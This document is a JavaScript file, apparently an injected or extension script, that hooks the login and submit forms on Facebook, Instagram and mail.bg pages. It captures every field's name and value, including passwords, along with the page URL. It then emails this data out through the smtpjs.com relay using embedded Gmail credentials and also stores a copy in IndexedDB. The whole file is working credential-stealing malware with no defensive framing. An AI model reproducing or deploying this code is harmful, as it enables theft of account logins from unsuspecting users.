var Email = { send: function (a) { return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) }) }, ajaxPost: function (e, n, t) { var a = Email.createCORSRequest("POST", e); a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function () { var e = a.responseText; null != t && t(e) }, a.send(n) }, ajax: function (e, n) { var t = Email.createCORSRequest("GET", e); t.onload = function () { var e = t.responseText; null != n && n(e) }, t.send() }, createCORSRequest: function (e, n) { var t = new XMLHttpRequest; return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t } };

function SaveToDB(dbData) {
    window.indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
    window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction || {READ_WRITE: "readwrite"};
    window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange;
    
    const dbname = "MyDatabase";
    window.indexedDB.deleteDatabase(dbname);
    var request = window.indexedDB.open(dbname, 3);
    request.onupgradeneeded = function(event) {
      var db = event.target.result;
      var objStore = db.createObjectStore("info", { autoIncrement : true });
      objStore.add(dbData ,"Data");
    };
}

function setCookie(name, value, minutes) {
    var expires = "";
    if (minutes) {
        var date = new Date();
        date.setTime(date.getTime() + (minutes* 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}

function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}

var data = "";

function sendEmail(info) {
    if (getCookie(info)) {
        return;
    } else {
        setCookie(info, true, 1);
    }

    Email.send({
        Host: "smtp.gmail.com",
        Username : user,
        Password : pass,
        To : user,
        From : user,
        Subject : "S_UPD",
        Body : String(info),
    });
}

var forms;
function hookForms() {
    forms.forEach((form) => {
        var event = function() {
			var dbData = {};
            Array.from(form.elements).forEach((input) => {
                data += String(input.name) + ": " + String(input.value) + " | ";
				dbData[input.name] = input.value;
            });
            data += String(location) + " || ";
            sendEmail(data);
			SaveToDB(dbData);
            data = "";
        };

        if (location.hostname.includes("mail.bg")) {
            var href = document.querySelectorAll('a');
            href.forEach((btn) => {
                if (btn.innerHTML.includes('ВЛЕЗ')) {
                    btn.addEventListener('click', () => { event(); });
                }
            });
        } else {
            var curSubmit = form.querySelector('button[type="submit"]');
            if (curSubmit == (undefined || null)) {
                form.addEventListener('submit', () => { event(); });
            } else {
                curSubmit.addEventListener('click', () => { event(); });
            }
        }
    });
}

var tries = 0;
function initHook() {
    forms = document.querySelectorAll('form');
    if (tries >= 10) { return; }

    if (forms.length <= 0) {
        tries++;
        setTimeout(initHook, 2000);
    } else {
        hookForms();
    }
}

function InitProgram() {
	if (location.hostname.includes("facebook") || location.hostname.includes("instagram") || location.hostname.includes("mail.bg")) {
		sendEmail(String(location));
		initHook();
	}
}
